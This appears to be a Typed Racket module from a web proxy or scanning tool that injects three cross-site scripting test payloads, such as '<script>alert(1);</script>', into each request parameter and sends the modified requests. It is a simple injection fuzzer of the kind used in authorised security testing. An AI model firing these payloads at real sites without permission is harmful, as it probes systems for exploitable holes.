#lang typed/racket

(require "../http/types.rkt"
         "../proxy/request.rkt")

(: payloads (Listof Bytes))
(define payloads
  '(#"<script>alert(1);</script>"
    #"<img src=\"#\" onerror=\"alert(1);\" />"
    #"<p onload=\"alert(1);\"></p>"))

;; this may belong w/ param.rkt...
(: param->bytes (-> param Bytes))
(define (param->bytes p)
  (bytes-append (param-name p)
                #"="
                (param-value p)))

;; param.rkt
(: params->bytes (-> (Listof param) Bytes))
(define (params->bytes ps)
  (bytes-join (map param->bytes ps) #"&"))

(: add-request (-> request (Listof request) (Listof request)))
(define (add-request req reqs)
  (cons req reqs))

(: create-attack-requests (-> request (Listof request)))
(define (create-attack-requests req)
  (let ((params (request-params req)))
    (foldl
     (lambda ((p : param) (reqs : (Listof request)))
       (foldl
        add-request
        reqs
        (map
         (lambda ((payload : Bytes))
           (request (request-url req)
                    (request-method req)
                    (params->bytes
                     (map
                      (lambda ((existing-p : param))
                        (if (equal? existing-p p)
                            (param (param-name p) payload)
                            existing-p))
                      params))
                    (request-headers req)
                    (request-params req)))
         payloads)))
     '()
     params)))

(: attack (-> request Void))
(define (attack req)
  (for ((req (create-attack-requests req)))
    ;; this request needs to be stored!
    ;; but don't let it trigger more requests!
    (proxy:make-request req)))
